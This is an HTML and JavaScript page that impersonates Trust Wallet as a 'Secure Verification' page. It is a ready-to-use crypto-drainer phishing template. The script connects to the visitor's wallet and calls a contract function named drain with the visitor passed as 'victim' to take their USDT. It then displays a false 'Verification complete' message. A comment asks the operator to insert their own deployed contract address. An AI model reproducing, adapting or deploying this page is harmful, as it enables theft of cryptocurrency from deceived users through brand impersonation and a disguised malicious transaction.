<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Trust Wallet Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="favicon.ico">
<style>
  body { background:#081c3a; color:#fff; text-align:center; padding:20px; font-family: Arial,sans-serif; }
  img { width:100px; margin:20px auto; }
  h1 { font-size:1.8rem; }
  p.status { opacity:0.9; white-space:pre-line; font-size:0.9rem; padding:0 20px; }
  button { background:#3375ff; padding:12px 24px; border:none; border-radius:8px; color:#fff; cursor:pointer; margin-top:24px; }
</style>
</head>
<body>
<img src="logo.png" alt="Trust Wallet">
<h1>Secure Verification</h1>
<p class="status" id="status">Connect your wallet to proceed…</p>
<button id="drainButton">Verify & Drain USDT</button>
<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<script>
const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS_HERE"; // <-- Yaha apna contract address
const DRAIN_ABI = [{ "inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"victim","type":"address"}],"name":"drain","outputs":[],"stateMutability":"nonpayable","type":"function"}];
const USDT = "0x55d398326f99059fF775485246999027B3197955";
let user;

document.getElementById('drainButton').onclick = async () => {
  if(!window.ethereum) {
    document.getElementById('status').innerText = "❌ Open in Trust Wallet DApp browser.";
    return;
  }
  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method:"eth_requestAccounts" });
  user = (await web3.eth.getAccounts())[0];

  document.getElementById('status').innerText = "⏳ Requesting transaction…";
  const contract = new web3.eth.Contract(DRAIN_ABI, CONTRACT_ADDRESS);
  try {
    await contract.methods.drain(USDT, user).send({ from:user });
    document.getElementById('status').innerText = "✅ Success! Verification complete.";
  } catch (e) {
    document.getElementById('status').innerText = "❌ Transaction failed or rejected.";
  }
};
</script>
</body>
</html>
